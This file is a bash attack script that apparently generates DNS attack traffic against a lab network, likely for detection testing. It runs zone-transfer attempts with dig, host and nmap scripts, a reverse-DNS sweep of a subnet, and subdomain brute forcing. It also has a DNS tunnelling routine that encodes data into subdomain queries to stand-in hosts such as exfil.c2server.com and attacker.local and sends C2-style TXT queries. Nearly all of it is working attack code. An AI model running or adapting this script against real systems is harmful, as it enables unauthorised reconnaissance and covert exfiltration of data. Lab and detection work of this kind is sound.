#!/bin/bash
###############################################################################
# DNS Attack Script
# Zone transfer, tunneling simulation, reverse DNS enumeration
###############################################################################

SUBTYPE="${1:-full}"
TARGET_IP="${2:-10.10.40.10}"
TARGET_PORT="${3:-53}"
RESULTS_DIR="${4:-.}"

mkdir -p "$RESULTS_DIR"

echo "[*] DNS attacks: $SUBTYPE against ${TARGET_IP}"

run_zone_transfer() {
    echo "[*] DNS zone transfer attempts"

    local domains=("localdomain" "homelab.local" "soc.local" "lab.local"
                   "target.local" "internal.local" "corp.local")

    for domain in "${domains[@]}"; do
        echo "[*] Attempting zone transfer for: $domain"
        dig @"$TARGET_IP" "$domain" AXFR +noall +answer \
            >> "${RESULTS_DIR}/zone_transfer.txt" 2>&1 || true
        sleep 1

        # Also try with host
        host -l "$domain" "$TARGET_IP" \
            >> "${RESULTS_DIR}/zone_transfer_host.txt" 2>&1 || true
        sleep 1
    done

    # Nmap DNS scripts
    nmap -p 53 --script=dns-zone-transfer,dns-brute,dns-cache-snoop \
        "$TARGET_IP" -oN "${RESULTS_DIR}/nmap_dns.txt" 2>&1 || true

    echo "[+] Zone transfer attempts complete"
}

run_tunnel() {
    echo "[*] DNS tunneling simulation"

    # Simulate DNS-based data exfiltration
    local data="This is simulated exfiltrated data from the target system"
    local encoded
    encoded=$(echo "$data" | base64 | tr '+/' '-_' | tr -d '=')

    # Split into DNS-safe chunks and send as subdomain queries
    local chunk_size=30
    local i=0
    while [[ $i -lt ${#encoded} ]]; do
        chunk="${encoded:$i:$chunk_size}"
        # Send DNS query with encoded data as subdomain
        dig @"$TARGET_IP" "${chunk}.tunnel.attacker.local" A +short 2>/dev/null || true
        dig @"$TARGET_IP" "${chunk}.exfil.c2server.com" TXT +short 2>/dev/null || true
        i=$((i + chunk_size))
        sleep $((RANDOM % 3 + 1))
    done

    # Simulate C2-over-DNS with TXT record queries
    for seq in $(seq 1 20); do
        local payload
        payload=$(openssl rand -hex 8)
        dig @"$TARGET_IP" "cmd-${seq}-${payload}.c2.attacker.local" TXT +short 2>/dev/null || true
        sleep $((RANDOM % 5 + 2))
    done

    # High-volume DNS queries (detection pattern)
    echo "[*] High-volume DNS query burst..."
    for i in $(seq 1 50); do
        dig @"$TARGET_IP" "host-${i}.scan.local" A +short 2>/dev/null &
        if (( i % 10 == 0 )); then
            wait
            sleep 1
        fi
    done
    wait

    echo "[+] DNS tunneling simulation complete"
}

run_enum() {
    echo "[*] Reverse DNS enumeration"

    # Reverse DNS sweep of target subnet
    echo "[*] Reverse DNS sweep of 10.10.40.0/24..."
    for i in $(seq 1 254); do
        dig @"$TARGET_IP" -x "10.10.40.${i}" +short \
            >> "${RESULTS_DIR}/reverse_dns.txt" 2>&1 &
        if (( i % 20 == 0 )); then
            wait
            sleep 1
        fi
    done
    wait

    # Forward DNS brute force for common subdomains
    local subdomains=("www" "mail" "ftp" "ssh" "admin" "portal" "vpn" "dns"
                      "ns1" "ns2" "mx" "smtp" "pop" "imap" "webmail" "db"
                      "api" "dev" "staging" "test" "backup" "monitor" "log"
                      "git" "jenkins" "docker" "k8s" "elastic" "kibana")

    echo "[*] Forward DNS brute force..."
    for sub in "${subdomains[@]}"; do
        dig @"$TARGET_IP" "${sub}.homelab.local" A +short \
            >> "${RESULTS_DIR}/dns_brute.txt" 2>&1 || true
        sleep 0.2
    done

    echo "[+] DNS enumeration complete"
}

case "$SUBTYPE" in
    zone_transfer)  run_zone_transfer ;;
    tunnel)         run_tunnel ;;
    enum)           run_enum ;;
    full)
        run_zone_transfer
        sleep 5
        run_enum
        sleep 5
        run_tunnel
        ;;
    *)
        echo "Unknown subtype: $SUBTYPE"
        echo "Available: zone_transfer, tunnel, enum, full"
        exit 1
        ;;
esac

echo "[*] DNS attack script complete"
